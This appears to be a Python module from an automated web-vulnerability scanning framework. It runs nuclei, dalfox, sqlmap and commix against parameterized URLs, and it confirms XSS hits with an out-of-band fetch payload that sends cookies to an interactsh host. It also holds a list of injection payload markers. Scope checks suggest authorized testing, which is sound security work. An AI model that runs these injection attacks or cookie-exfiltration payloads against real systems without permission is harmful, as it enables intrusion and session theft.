"""
Injection playbook chain.

Finds: SQLi, XSS, SSTI, command injection in parameterized endpoints.

Reads recon_summary.json for live_urls and historical_urls.
Filters to only URLs with parameters (contains ? and =).

Stage map:
  1. Nuclei injection templates (all depths)
  2. dalfox XSS scan on parameterized URLs (all depths)
  3. [NEW] Phase 2 XSS confirmation — for every dalfox hit, fire an interactsh
     OAST payload and wait for callback. Only mark as exploitable if callback received.
  4. sqlmap SQLi scan on high-value parameterized URLs (standard+exhaustive)
  5. commix command injection (exhaustive)

Two-phase XSS rule:
  Phase 1 (dalfox): confirms the injection point with alert() / PoC.
  Phase 2 (interactsh): replaces payload with fetch(OAST_URL/?c=cookie) and
  waits for a real callback. Finding is only marked execution_status=callback_received
  if Phase 2 fires. Without a callback, status stays at attempted_no_callback.
"""

from __future__ import annotations

import json
import logging
import re
import urllib.request
import urllib.parse
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlunparse

from tools.nuclei import NucleiWrapper
from tools.dalfox import DalfoxWrapper
from tools.sqlmap import SqlmapWrapper
from tools.commix import CommixWrapper
from tools.base import ToolWrapper
from tools.interactsh import InteractshWrapper, format_callback_evidence

log = logging.getLogger(__name__)

_PARAM_RE = re.compile(r'\?[^&=\s]+=[^&\s]')

_HIGH_VALUE_PARAMS = {
    "id", "user", "uid", "username", "name", "file", "path", "dir",
    "page", "search", "q", "query", "cmd", "exec", "command", "url",
    "redirect", "return", "next", "target", "dest", "destination",
    "include", "require", "template", "view", "lang", "locale",
    "order", "sort", "col", "category", "type", "format", "callback",
    "jsonp", "token", "key", "api_key", "secret", "email", "login",
}

# Substrings that indicate a URL already carries an injection payload from a
# historical scanner run — skip these, they're not clean targets.
_PAYLOAD_MARKERS = (
    "union", "select", "sleep(", "waitfor", "extractvalue",
    "0x", "%27", "%22", "1=1", "or 1", "and 1", "xp_cmd",
    "<script", "alert(", "onerror=", "javascript:",
    "/../", "/etc/passwd", "cmd.exe", "/bin/sh",
    "PROCEDURE", "ANALYSE", "MSysAccess",
)

# Caps by depth: (dalfox_urls, sqlmap_unique_endpoints)
_DEPTH_CAPS = {
    "quick":      (100,  0),
    "standard":   (300, 10),
    "exhaustive": (500, 25),
}


def run(
    program: dict,
    depth: str,
    run_id: str,
    run_dir: Path,
    raw_output_dir: Path,
    session: dict | None = None,
) -> dict:
    extra_headers = ToolWrapper._auth_headers(session)
    cookies = ToolWrapper._auth_cookies(session)

    tools_invoked: list[dict] = []
    raw_output_paths: list[Path] = []

    recon = _load_recon_summary(run_dir)
    live_urls = recon.get("live_urls", [])
    historical_urls = recon.get("historical_urls", [])
    seed_domains = recon.get("seed_domains", ["target"])
    primary_target = seed_domains[0] if seed_domains else "target"

    all_urls = list(set(live_urls + historical_urls))
    # Sanitize: drop malformed URLs (embedded schemes, over-long paths, non-HTTP)
    all_urls = ToolWrapper.sanitize_urls(all_urls)
    # Strip URLs that already carry injection payloads (historical scanner noise)
    clean_urls = [u for u in all_urls if not _has_payload(u)]
    param_urls = [u for u in clean_urls if _PARAM_RE.search(u)]
    high_value_urls = _filter_high_value(param_urls)
    # Deduplicate by unique (path, param_names) to avoid hammering same endpoint
    unique_sqli_targets = _dedup_by_endpoint(high_value_urls)

    dalfox_cap, sqlmap_cap = _DEPTH_CAPS.get(depth, (300, 10))

    log.info(
        "[Injection] %d parameterized URLs (%d high-value, %d unique endpoints) from %d total",
        len(param_urls), len(high_value_urls), len(unique_sqli_targets), len(all_urls),
    )

    # -----------------------------------------------------------------------
    # Stage 1 — Nuclei injection templates
    # -----------------------------------------------------------------------
    log.info("[Injection] Stage 1: Nuclei injection templates")

    nuclei = NucleiWrapper()
    if nuclei.available() and live_urls:
        r = nuclei.run(
            target=primary_target,
            depth=depth,
            run_id=run_id,
            raw_output_dir=raw_output_dir,
            program=program,
            urls=live_urls,
            extra_tags=["sqli", "xss", "ssti", "injection", "rce", "ssrf", "xxe", "lfi", "idor"],
            extra_headers=extra_headers or None,
            cookies=cookies or None,
        )
        raw_output_paths.append(r["raw_output_path"])
        tools_invoked.append(_tool_entry(nuclei, r))

    # -----------------------------------------------------------------------
    # Stage 2 — dalfox XSS (Phase 1: confirm injection point)
    # -----------------------------------------------------------------------
    log.info("[Injection] Stage 2: dalfox XSS Phase 1 (%d param URLs)", len(param_urls))

    dalfox_hits: list[dict] = []   # findings with confirmed injection points

    dalfox = DalfoxWrapper()
    if dalfox.available() and param_urls and "xss" in program.get("allowed_test_types", []):
        xss_targets = high_value_urls if depth == "quick" else param_urls
        xss_targets = xss_targets[:dalfox_cap]
        r = dalfox.run(
            target=primary_target,
            depth=depth,
            run_id=run_id,
            raw_output_dir=raw_output_dir,
            program=program,
            urls=xss_targets,
            extra_headers=extra_headers or None,
            cookies=cookies or None,
        )
        raw_output_paths.append(r["raw_output_path"])
        tools_invoked.append(_tool_entry(dalfox, r))
        dalfox_hits = r.get("findings", [])

    # -----------------------------------------------------------------------
    # Stage 3 — Interactsh OAST Phase 2 XSS confirmation
    #
    # For each URL where dalfox confirmed an injection point, fire an
    # interactsh fetch() payload and wait for an out-of-band callback.
    # Only findings that receive a callback are marked execution_status=
    # callback_received. Without a callback the finding stays as
    # attempted_no_callback and is gated from LLM triage.
    # -----------------------------------------------------------------------
    log.info("[Injection] Stage 3: OAST Phase 2 XSS confirmation (%d hits)", len(dalfox_hits))

    oast_wrapper = InteractshWrapper()
    if oast_wrapper.available() and dalfox_hits and "xss" in program.get("allowed_test_types", []):
        _confirm_xss_hits_with_oast(
            dalfox_hits=dalfox_hits,
            raw_output_dir=raw_output_dir,
            run_dir=run_dir,
            extra_headers=extra_headers,
            cookies=cookies,
        )
    elif dalfox_hits:
        # interactsh unavailable — mark all dalfox hits as attempted_no_callback
        log.warning(
            "[Injection] interactsh not available — dalfox hits marked attempted_no_callback. "
            "Install cryptography: pip install cryptography"
        )
        _mark_execution_status(raw_output_dir, dalfox_hits, "attempted_no_callback")

    # -----------------------------------------------------------------------
    # Stage 4 — sqlmap SQLi (standard+exhaustive)
    # -----------------------------------------------------------------------
    if depth in ("standard", "exhaustive"):
        log.info("[Injection] Stage 3: sqlmap SQLi scan")

        sqlmap = SqlmapWrapper()
        if sqlmap.available() and param_urls and "sqli" in program.get("allowed_test_types", []):
            sqli_targets = unique_sqli_targets[:sqlmap_cap] if unique_sqli_targets else param_urls[:sqlmap_cap]
            r = sqlmap.run_multi(
                urls=sqli_targets,
                target=primary_target,
                depth=depth,
                run_id=run_id,
                raw_output_dir=raw_output_dir,
                program=program,
                extra_headers=extra_headers or None,
                cookies=cookies or None,
            )
            raw_output_paths.append(r["raw_output_path"])
            tools_invoked.append(_tool_entry(sqlmap, r))

    # -----------------------------------------------------------------------
    # Stage 5 — commix command injection (exhaustive)
    # -----------------------------------------------------------------------
    if depth == "exhaustive":
        log.info("[Injection] Stage 4: commix command injection")

        commix = CommixWrapper()
        if commix.available() and high_value_urls and "command_injection" in program.get("allowed_test_types", []):
            for url in high_value_urls[:30]:
                r = commix.run(
                    target=_host_from_url(url),
                    depth=depth,
                    run_id=run_id,
                    raw_output_dir=raw_output_dir,
                    program=program,
                    url=url,
                )
                raw_output_paths.append(r["raw_output_path"])
                tools_invoked.append(_tool_entry(commix, r))

    return {"tools_invoked": tools_invoked, "raw_output_paths": raw_output_paths}


def _has_payload(url: str) -> bool:
    """Return True if a URL already contains an injection payload string."""
    lower = url.lower()
    return any(marker.lower() in lower for marker in _PAYLOAD_MARKERS)


def _dedup_by_endpoint(urls: list[str]) -> list[str]:
    """
    Return one representative URL per unique (path, frozenset(param_names)).
    Prevents sqlmap from testing the same endpoint 20 times with different payloads.
    """
    seen: set = set()
    result: list[str] = []
    for url in urls:
        try:
            parsed = urlparse(url)
            param_names = frozenset(parse_qs(parsed.query).keys())
            key = (parsed.netloc, parsed.path, param_names)
            if key not in seen:
                seen.add(key)
                # Rebuild URL with clean param values (just the param names, value=test)
                clean_qs = "&".join(f"{k}=test" for k in sorted(param_names))
                clean_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, clean_qs, "",
                ))
                result.append(clean_url)
        except Exception:
            pass
    return result


def _filter_high_value(urls: list[str]) -> list[str]:
    result = []
    for url in urls:
        try:
            qs = parse_qs(urlparse(url).query)
            if any(k.lower() in _HIGH_VALUE_PARAMS for k in qs):
                result.append(url)
        except Exception:
            pass
    return result


def _load_recon_summary(run_dir: Path) -> dict:
    p = run_dir / "recon_summary.json"
    if not p.exists():
        log.warning("[Injection] recon_summary.json not found")
        return {}
    with open(p) as f:
        return json.load(f)


def _host_from_url(url: str) -> str:
    from urllib.parse import urlparse
    return urlparse(url).hostname or url


def _tool_entry(wrapper, result: dict) -> dict:
    return {
        "tool_name": wrapper.name,
        "tool_version": wrapper.tool_version(),
        "status": "success",
        "raw_output_path": str(result["raw_output_path"]),
        "findings_count": result.get("findings_count", 0),
    }


def _confirm_xss_hits_with_oast(
    dalfox_hits: list[dict],
    raw_output_dir: Path,
    run_dir: Path,
    extra_headers: dict | None,
    cookies: str | None,
) -> None:
    """
    Phase 2 XSS confirmation. For each dalfox hit:
    1. Start an interactsh session.
    2. Build a fetch(OAST_URL/?c=cookie) payload at the injection point.
    3. Send the request.
    4. Poll for callback.
    5. Patch the finding in the raw_output/dalfox.json with execution_status.

    Skips any finding missing a url field.
    """
    from tools.interactsh import InteractshWrapper, format_callback_evidence

    oast_wrapper = InteractshWrapper()

    for hit in dalfox_hits:
        hit_url = hit.get("url", "")
        if not hit_url:
            continue

        try:
            session = oast_wrapper.new_session()
            oast_host = session.start()
            oast_payload = session.get_payload("xss")

            # Build probe URL: inject the OAST payload into the vulnerable parameter
            # dalfox findings include the parameter name in evidence/metadata
            param = _extract_param_from_evidence(hit.get("evidence", ""))
            if param:
                probe_url = _inject_payload_into_param(hit_url, param, oast_payload)
            else:
                # Fallback: append as a new parameter
                sep = "&" if "?" in hit_url else "?"
                probe_url = f"{hit_url}{sep}q={urllib.parse.quote(oast_payload)}"

            # Fire the probe
            _send_probe(probe_url, extra_headers, cookies)

            # Poll for callback
            callbacks = session.poll_callbacks(timeout=30)
            session.stop()

            confirmed = len(callbacks) > 0
            status = "callback_received" if confirmed else "attempted_no_callback"

            # Take screenshot of probe URL for evidence
            screenshot_path = None
            if confirmed:
                try:
                    from intelligence.browser import capture_xss_screenshot
                    import uuid as _uuid
                    fid = hit.get("finding_id") or str(_uuid.uuid4())
                    screenshot_path = capture_xss_screenshot(
                        url=probe_url,
                        finding_id=fid,
                        run_dir=run_dir,
                    )
                    if screenshot_path:
                        status = "screenshot_confirmed"
                except Exception as exc:
                    log.debug("[Injection] Screenshot failed: %s", exc)

            evidence_str = format_callback_evidence(callbacks, oast_host)
            _patch_finding_execution_status(
                raw_output_dir=raw_output_dir,
                hit=hit,
                execution_status=status,
                execution_evidence=str(screenshot_path) if screenshot_path else evidence_str,
                oast_host=oast_host,
                blocking_conditions=[] if confirmed else [
                    "OAST callback not received within 30s — "
                    "payload may require user interaction (stored XSS) or "
                    "target may block outbound connections"
                ],
            )

            log.info(
                "[Injection] Phase 2 XSS %s — %s (%s)",
                "CONFIRMED" if confirmed else "no callback",
                hit_url[:80],
                oast_host,
            )

        except Exception as exc:
            log.warning("[Injection] Phase 2 failed for %s: %s", hit_url[:80], exc)
            _patch_finding_execution_status(
                raw_output_dir=raw_output_dir,
                hit=hit,
                execution_status="attempted_no_callback",
                execution_evidence=f"Phase 2 error: {exc}",
                oast_host="",
                blocking_conditions=[f"OAST probe error: {exc}"],
            )


def _mark_execution_status(
    raw_output_dir: Path,
    hits: list[dict],
    status: str,
) -> None:
    for hit in hits:
        _patch_finding_execution_status(
            raw_output_dir=raw_output_dir,
            hit=hit,
            execution_status=status,
            execution_evidence="",
            oast_host="",
            blocking_conditions=["interactsh not available"],
        )


def _patch_finding_execution_status(
    raw_output_dir: Path,
    hit: dict,
    execution_status: str,
    execution_evidence: str,
    oast_host: str,
    blocking_conditions: list[str],
) -> None:
    """Patch execution_status fields into the dalfox raw_output JSON."""
    dalfox_path = raw_output_dir / "dalfox.json"
    if not dalfox_path.exists():
        return
    try:
        import json as _json
        with open(dalfox_path) as f:
            doc = _json.load(f)
        hit_url = hit.get("url", "")
        hit_evidence = hit.get("evidence", "")[:120]
        for finding in doc.get("findings", []):
            if (finding.get("url", "") == hit_url and
                    finding.get("evidence", "")[:120] == hit_evidence):
                finding["execution_status"] = execution_status
                finding["execution_evidence"] = execution_evidence
                finding["oast_host"] = oast_host
                finding["blocking_conditions"] = blocking_conditions
        with open(dalfox_path, "w") as f:
            _json.dump(doc, f, indent=2)
    except Exception as exc:
        log.debug("[Injection] Could not patch dalfox.json: %s", exc)


def _extract_param_from_evidence(evidence: str) -> str:
    """Try to extract the vulnerable parameter name from dalfox evidence string."""
    # dalfox typically outputs: "VULN param=<name> ..."
    import re as _re
    m = _re.search(r'param[= ]+["\']?(\w+)', evidence, _re.IGNORECASE)
    return m.group(1) if m else ""


def _inject_payload_into_param(url: str, param: str, payload: str) -> str:
    """Replace the value of *param* in *url* with *payload*."""
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    if param in qs:
        qs[param] = [payload]
    new_query = "&".join(
        f"{k}={urllib.parse.quote(v[0], safe='')}"
        for k, v in qs.items()
    )
    return urlunparse((
        parsed.scheme, parsed.netloc, parsed.path,
        parsed.params, new_query, parsed.fragment,
    ))


def _send_probe(url: str, extra_headers: dict | None, cookies: str | None) -> None:
    """Fire a GET request to the probe URL."""
    try:
        headers = dict(extra_headers or {})
        if cookies:
            headers["Cookie"] = cookies
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=15) as resp:
            resp.read()
    except Exception as exc:
        log.debug("[Injection] Probe request failed (may be expected): %s", exc)
